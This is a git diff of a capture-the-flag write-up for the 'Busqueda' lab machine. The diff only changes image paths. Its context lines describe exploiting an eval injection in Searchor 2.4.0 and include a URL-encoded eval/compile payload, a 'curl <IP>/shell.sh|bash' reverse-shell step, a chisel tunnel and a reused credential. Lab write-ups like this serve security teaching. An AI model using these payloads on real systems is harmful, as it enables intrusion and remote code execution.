@@ -22,19 +22,19 @@ We would have to add `searcher.htb` to our `/etc/hosts` file to view the website
 
 This website seems to be a type of search engine using Flask:
 
-![](<../../.gitbook/assets/image%20(3211).png>)
+![](../../.gitbook/assets/busqueda-9.png)
 
 We can submit queries at the bottom using a custom machine and stuff:
 
-![](<../../.gitbook/assets/image%20(3832).png>)
+![](../../.gitbook/assets/busqueda-10.png)
 
 Whatever query we do here, depending on the engine, it would generate a URL for us with a `query` parameter appended at the end:
 
-![](<../../.gitbook/assets/image%20(2869).png>)
+![](../../.gitbook/assets/busqueda-7.png)
 
 It seems that the website rejects any engine that is not present on its list. Running `gobuster` does not seem to reveal anything of interest, so let's take a closer look at the website itself. At the very bottom, it seems there's a link to the software being used, which is Searchor 2.4.0:
 
-![](<../../.gitbook/assets/image%20(1744).png>)
+![](../../.gitbook/assets/busqueda-3.png)
 
 {% embed url="https://github.com/ArjunSharda/Searchor" %}
 
@@ -44,17 +44,17 @@ Looks like we need to do some source code review on this library.
 
 The repository seems to be on v2.5.0, while the website is running v2.4.0. As such, we probably need to dive into the logs of this website to find out what was changed from v2.4.0. Looking at the commit history, we see that there's a `remove eval from search cli method` commit made:
 
-![](<../../.gitbook/assets/image%20(1856).png>)
+![](../../.gitbook/assets/busqueda-4.png)
 
 Here are the changes made:
 
-![](<../../.gitbook/assets/image%20(3024).png>)
+![](../../.gitbook/assets/busqueda-8.png)
 
 This is vulnerbale because it uses `eval` to run the queries. Checking the v ersion, this edit was made for v2.4.2f, which means the machine is running a vulnerable version that is outdated since changes were not made for v2.4.0, specifically in the `query` parameter.
 
 I sent `import('os').system('ping -c 1 10.10.16.41')` as the query, and got a response on `tcpdump`:
 
-![](<../../.gitbook/assets/image%20(2335).png>)
+![](../../.gitbook/assets/busqueda-5.png)
 
 Now, we just need to gain a reverse shell. It seems that `eval` as it cannot process the reverse shells I put in. I found this writeup for a bug bounty that bypasses this by using `compile()`.
 
@@ -66,11 +66,11 @@ However, this exploit would require us to 'close' the previous `eval` function a
 d'%2beval(compile('for+x+in+range(1)%3a\n+import+os\n+os.system("curl+http%3a//10.10.16.41/test")','a','single'))%2b'
 ```
 
-![](<../../.gitbook/assets/image%20(2599).png>)
+![](../../.gitbook/assets/busqueda-6.png)
 
 All we have to do is change the command to `curl <IP>/shell.sh|bash`.
 
-![](<../../.gitbook/assets/image%20(796).png>)
+![](../../.gitbook/assets/busqueda-11.png)
 
 With this, we can grab the user flag.
 
@@ -165,11 +165,11 @@ chisel server -p 1080 --reverse
 
 Then we can access http://localhost:3000 to view Gitea:
 
-![](<../../.gitbook/assets/image%20(1195).png>)
+![](../../.gitbook/assets/busqueda-1.png)
 
 Using the same MySQL password of `yuiu1hoiu4i5ho1uh`, we can login as `administrator`. We can see some repos:
 
-![](<../../.gitbook/assets/image%20(1593).png>)
+![](../../.gitbook/assets/busqueda-2.png)
 
 And within administrator / scripts repo, we can read the system checkup script:
 
